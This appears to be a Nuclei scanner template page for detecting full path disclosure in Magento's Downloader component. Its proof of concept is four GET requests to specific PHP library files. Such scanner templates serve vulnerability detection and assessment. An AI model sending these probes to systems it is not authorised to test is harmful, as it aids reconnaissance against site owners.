# Nuclei Template: Magento Downloader - Full Path Disclosure
**Template ID:** magento-downloader-fpd
**Vulnerability Class:** Information Disclosure
**Severity:** Low
**CWE:** CWE-200
**Source:** Nuclei Template (`magento-downloader-fpd.yaml`)

## Vulnerability Information & PoC

## Description
Detected Magento Downloader component exposed internal file system paths through direct file access.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/downloader/lib/Mage/Backup/Nomedia.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Tar.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Gz.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Bz.php
```

## References
- https://magento.com
